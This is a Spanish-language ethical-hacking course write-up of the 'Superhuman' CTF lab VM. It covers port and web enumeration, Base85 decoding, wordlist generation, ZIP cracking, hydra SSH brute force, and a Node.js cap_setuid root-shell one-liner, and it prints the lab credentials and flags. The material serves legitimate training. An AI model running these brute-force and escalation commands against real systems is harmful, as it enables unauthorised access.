---
title: "🖥️ Máquina: Superhuman — Hacking Ético"
aliases:
  - Superhuman
  - superhuman
  - Máquina Superhuman
  - VM Superhuman
  - Writeup Superhuman
tags:
  - ifct0109
  - hacking-etico
  - vms
  - avanzadas
  - linux
  - ctf
---

# 🖥️ Máquina: Superhuman

> [!abstract] Ficha Técnica del Laboratorio
> **Sistema Operativo:** Linux  
> **Categoría:** Avanzadas  
> **Técnicas trabajadas:** Enumeración web · Fuzzing de directorios · Decodificación Base85 · Generación de diccionarios (crunch, cewl) · Cracking de ZIP · Fuerza bruta SSH (hydra) · Escalada de privilegios (Linux Capabilities / Node.js)  
> **Descripción:** En esta práctica analizaremos una web en busca de archivos ocultos, decodificaremos un mensaje en Base85, generaremos diccionarios personalizados con crunch y cewl, crackearemos un ZIP protegido y accederemos al sistema. La escalada de privilegios se realizará abusando de una capability asignada al intérprete Node.js.  
> 
> 🔗 **Navegación:** [[02 - MODULOS/Hacking Ético/03 - Máquinas Hackeables (VMs)|⬅️ Catálogo de Máquinas Hackeables]] &emsp;|&emsp; [[02 - MODULOS/04 - Hacking Ético|🧪 Hacking Ético]] &emsp;|&emsp; [[00 - INDICE|🏠 Inicio]]

---

## ⚙️ Configuración del Entorno de Red

Para ejecutar los comandos en tu laboratorio local (Red NAT):

* **`LHOST` (Atacante / Kali Linux):** Ej. `10.0.0.44`
* **`RHOST` (Víctima / Superhuman):** Ej. `10.0.0.47`

> [!tip] Detección Previa de IP Víctima
> Si no conoces la IP asignada a la máquina Superhuman tras encenderla, ejecuta en Kali:
> ```bash
> sudo netdiscover -r 10.0.0.0/24
> ```

---

## 🔎 Fase 1: Enumeración de servicios

Comenzamos con un escaneo completo de puertos TCP:

```bash
nmap -sT -p- 10.0.0.47
```

```text
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

> [!info] Resultado
> Solo dos puertos abiertos: SSH en el 22 y HTTP en el 80. Al no haber servicios adicionales expuestos, la web será el punto de entrada principal.

Lanzamos un escaneo detallado para identificar versiones:

```bash
nmap -A -p22,80 10.0.0.47
```

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: Site doesn't have a title (text/html).
|_  Supported Methods: POST OPTIONS HEAD GET
```

> [!info] Resultado
> El servidor web corre Apache 2.4.38 sobre Debian. La página principal no tiene título, lo que sugiere que el contenido interesante estará en rutas no evidentes.

---

## 🌐 Fase 2: Enumeración web

Revisamos el código fuente de la página principal buscando pistas ocultas. Encontramos una referencia a una imagen:

```text
img src="index_fichiers/nietzsche.jpg"
```

> [!info] Resultado
> La ruta del código fuente no carga la imagen directamente, pero probando variantes de la URL la encontramos accesible en la raíz del servidor. La descargamos para analizarla:

```bash
wget http://10.0.0.47/nietzsche.jpg
```

Probamos si la imagen contiene datos ocultos mediante esteganografía usando stegcracker, que automatiza el proceso probando contraseñas del diccionario:

```bash
sudo apt install stegcracker
```

```bash
stegcracker nietzsche.jpg /usr/share/wordlists/rockyou.txt
```

> [!info] Resultado
> Lo detenemos tras un tiempo: tarda demasiado y no encuentra nada. La imagen es un callejón sin salida. Continuamos buscando por la web.

Usamos gobuster con el diccionario big de SecLists para buscar directorios y archivos ocultos. Este diccionario es más grande que los habituales y puede tardar varios minutos:

```bash
gobuster dir -r -u http://10.0.0.47 -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-big.txt -x php,html,txt
```

```text
/notes-tips.txt    (Status: 200) [Size: 286]
```

> [!info] Resultado
> Encontramos un archivo de texto accesible en la web. Lo leemos:

```bash
curl http://10.0.0.47/notes-tips.txt
```

```text
F(&m'D.Oi#De4!--ZgJT@;^00D.P7@8LJ?tF)N1B@:UuC/g+jUD'3nBEb-A+De'u)F!,")@:UuC/g(Km+CoM$DJL@Q+Dbb6ATDi7De:+g@<HBpDImi@/hSb!FDl(?A9)g1CERG3Cb?i%-Z!TAGB.D>AKYYtEZed5E,T<)+CT.u+EM4--Z!TAA7]grEb-A1AM,)s-Z!TADIIBn+DGp?F(&m'D.R'_DId*=59NN?A8c?5F<G@:Dg*f@$:u@WF`VXIDJsV>AoD^&ATT&:D]j+0G%De1F<G"0A0>i6F<G!7B5_^!+D#e>ASuR'Df-\,ARf.kF(HIc+CoD.-ZgJE@<Q3)D09?%+EMXCEa`Tl/c
```

> [!info] Resultado
> El contenido parece cifrado o codificado. Lo pegamos en CyberChef y usamos la opción Magic para identificar automáticamente el tipo de codificación. CyberChef lo detecta como Base85 y lo decodifica:

```text
salome doesn't want me, I'm so sad... i'm sure god is dead... 
I drank 6 liters of Paulaner.... too drunk lol. I'll write her a poem and she'll desire me. 
I'll name it salome_and_?? I don't know.
I must not forget to save it and put a good extension because I don't have much storage.
```

> [!info] Resultado
> El mensaje decodificado nos da varias pistas importantes:
> · Existe un archivo llamado salome_and_?? donde ?? son dos caracteres desconocidos.
> · El autor menciona que usará una extensión concreta porque tiene poco almacenamiento, lo que sugiere un formato comprimido como .zip o .rar.
> · El tono del mensaje y el nombre del poema nos dan también una pista sobre el posible usuario del sistema.

---

## 📖 Fase 3: Generación de diccionario y búsqueda del archivo

Sabemos que el archivo se llama salome_and_?? donde los dos últimos caracteres son desconocidos. Usamos crunch para generar todas las combinaciones posibles con letras minúsculas y guardamos el resultado en un diccionario:

```bash
crunch 13 13 -t "salome_and_@@" > salome.txt
```

```bash
cat salome.txt
```

> [!info] Resultado
> crunch genera todas las combinaciones posibles para el patrón indicado. El símbolo @ representa cualquier letra minúscula. Con el diccionario generado buscamos el archivo en la web con extensiones de archivo comprimido:

```bash
gobuster dir -r -u http://10.0.0.47 -w salome.txt -x zip,rar
```

```text
/salome_and_me.zip    (Status: 200) [Size: 452]
```

> [!info] Resultado
> Encontramos el archivo: salome_and_me.zip. Lo descargamos:

```bash
wget http://10.0.0.47/salome_and_me.zip
```

---

## 🔓 Fase 4: Cracking del ZIP

El ZIP está protegido con contraseña. Extraemos su hash con zip2john y lo crackeamos con John the Ripper:

```bash
zip2john salome_and_me.zip > salome.hash
```

```bash
john salome.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

```text
turtle           (salome_and_me.zip/salome_and_me.txt)
```

> [!info] Resultado
> Contraseña encontrada: turtle. Descomprimimos el ZIP:

```bash
unzip salome_and_me.zip
```

```text
Archive:  salome_and_me.zip
[salome_and_me.zip] salome_and_me.txt password: turtle
  inflating: salome_and_me.txt
```

```bash
cat salome_and_me.txt
```

```text
----------------------------------------------------
	     GREAT POEM FOR SALOME
----------------------------------------------------
My name is fred,
And tonight I'm sad, lonely and scared,
Because my love Salome prefers schopenhauer, asshole,
I hate him he's stupid, ugly and a peephole,
My darling I offered you a great switch,
And now you reject my love, bitch
I don't give a fuck, I'll go with another lady,
And she'll call me BABY!
```

> [!info] Resultado
> El poema nos da información clave:
> · El autor se llama fred, que es probablemente un usuario del sistema.
> · El poema menciona varias palabras que pueden ser candidatas a contraseña. En lugar de seleccionarlas manualmente, usaremos cewl para extraerlas automáticamente.

---

## 📋 Fase 5: Generación de diccionario con cewl y fuerza bruta SSH

cewl es una herramienta que extrae palabras de una página web o archivo para crear un diccionario personalizado. Como el archivo está en local, levantamos un servidor HTTP temporal con Python para que cewl pueda leerlo:

```bash
python3 -m http.server 8080
```

En otra terminal ejecutamos cewl apuntando al archivo servido. La opción -m 2 indica longitud mínima de 2 caracteres y -w el archivo de salida:

```bash
cewl -m 2 -w diccionario2.txt http://127.0.0.1:8080/salome_and_me.txt
```

```bash
cat diccionario2.txt
```

> [!info] Resultado
> El diccionario contiene todas las palabras extraídas del poema. Ahora usamos hydra para probar cada una como contraseña del usuario fred por SSH. La opción -t 4 limita las conexiones simultáneas para no sobrecargar el servicio y -f detiene el ataque en cuanto encuentra una contraseña válida:

```bash
hydra -l fred -P diccionario2.txt ssh://10.0.0.47 -t 4 -f
```

```text
[22][ssh] host: 10.0.0.47   login: fred   password: schopenhauer
```

> [!info] Resultado
> Credenciales encontradas:
> · Usuario: fred
> · Contraseña: schopenhauer
> La contraseña coincide con el filósofo mencionado en el poema, justo el rival amoroso del autor.

---

## 🔑 Fase 6: Acceso SSH y flag de usuario

```bash
ssh fred@10.0.0.47
```

```text
# Contraseña: schopenhauer
```

> [!warning] Advertencia
> ⚠️ Atención: En esta máquina el comando ls ha sido sustituido por una versión manipulada que cierra la sesión SSH al ejecutarse. No uses ls. Para listar archivos usaremos find. Al final de la práctica veremos que dir también funciona como alternativa.

```bash
find . -type f 2>/dev/null
```

```text
./cmd.txt
./user.txt
```

```bash
cat user.txt
```

```text
Ineedmorepower
```

```bash
cat cmd.txt
```

```text
"ls" command has a new name ?!! WTF !
```

> [!info] Resultado
> El archivo cmd.txt confirma que ls ha sido renombrado o reemplazado deliberadamente. Flag de usuario obtenida: Ineedmorepower.

---

## 🚀 Fase 7: Escalada de privilegios — Linux Capabilities

Comprobamos primero las vías habituales de escalada:

```bash
sudo -l
```

```text
-bash: sudo: command not found
```

```bash
find / -type f -perm -u=s 2>/dev/null
```

> [!info] Resultado
> Ningún resultado. No hay binarios SUID explotables. Buscamos por otra vía: las Linux Capabilities.

Las Linux Capabilities son una alternativa más granular al bit SUID. En lugar de dar a un binario todos los privilegios de root, las capabilities permiten asignar permisos específicos y concretos. Por ejemplo, en lugar de que un binario sea SUID root completo, se le puede dar solo la capacidad de abrir puertos privilegiados o cambiar el UID del proceso.

La capability cap_setuid permite a un proceso cambiar su UID al que quiera, incluido el 0 (root). Si un binario tiene esta capability con el flag +ep (effective + permitted), puede usarla sin restricciones. Buscamos binarios con capabilities asignadas:

```bash
/usr/sbin/getcap / -r 2>/dev/null | grep setuid
```

```text
/usr/bin/node = cap_setuid+ep
```

> [!info] Resultado
> El intérprete Node.js tiene asignada la capability cap_setuid+ep. Esto significa que Node.js puede cambiar el UID del proceso a cualquier valor, incluido el 0 (root), y ejecutar comandos con ese UID. A diferencia del SUID, esto no aparece en una búsqueda de binarios con find -perm -u=s, por eso es importante buscar capabilities por separado.
> Consultamos GTFOBins → node → Capabilities para ver el exploit recomendado.

El exploit usa process.setuid(0) para cambiar el UID del proceso a root, y luego lanza una shell interactiva con child_process.spawn:

```bash
/usr/bin/node -e 'process.setuid(0); require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})'
```

```text
# id;hostname
uid=0(root) gid=1000(fred) groups=1000(fred),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)
superhuman
```

> [!info] Resultado
> Obtenemos una shell como root. El UID es 0 (root) aunque el GID sigue siendo el de fred, lo que es normal al usar setuid sin cambiar el grupo. Leemos la flag final:

```bash
cd /root
cat root.txt
```

```text
Imthesuperhuman
```

> [!info] Resultado
> Flag de root obtenida: Imthesuperhuman
> Como nota final: el sustituto de ls en esta máquina es dir, que realiza la misma función y no está manipulado.

---

> [!note] 🔗 Enlaces Relacionados
> * 💻 [[02 - MODULOS/Hacking Ético/03 - Máquinas Hackeables (VMs)|Volver al Catálogo de Máquinas Hackeables]]
> * 🌐 [[02 - MODULOS/Hacking Ético/01 - Web Fuzzing|Guía de Web Fuzzing]]
> * 🔍 [[02 - MODULOS/Hacking Ético/02 - Reconocimiento Bug Bounty|Metodología de Reconocimiento]]
